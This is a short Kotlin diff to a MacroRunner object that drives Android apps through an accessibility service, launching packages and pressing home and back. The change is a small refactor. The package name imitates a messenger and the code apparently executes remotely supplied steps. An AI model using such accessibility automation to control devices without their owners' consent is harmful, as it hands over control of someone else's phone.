@@ -1,5 +1,7 @@
 package com.telegram2.messaging.remote
 
+import android.accessibilityservice.AccessibilityService
+
 object MacroRunner {
     var currentPackage: String? = null
 
@@ -35,7 +37,6 @@ object MacroRunner {
                 "launch" -> {
                     val pkg = step.data as? String
                     if (pkg != null) {
-                        currentPackage = pkg
                         service.runOnMainThread { service.launchApp(pkg) }
                         Thread.sleep(3000)
                     }
@@ -72,10 +73,13 @@ object MacroRunner {
                     Thread.sleep(dur + 500)
                     true
                 }
-                "home", "back" -> {
-                    val action = if (step.type == "home") AccessibilityService.GLOBAL_ACTION_HOME
-                    else AccessibilityService.GLOBAL_ACTION_BACK
-                    service.runOnMainThread { service.performGlobalAction(action) }
+                "home" -> {
+                    service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
+                    Thread.sleep(1000)
+                    true
+                }
+                "back" -> {
+                    service.runOnMainThread { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
                     Thread.sleep(1000)
                     true
                 }
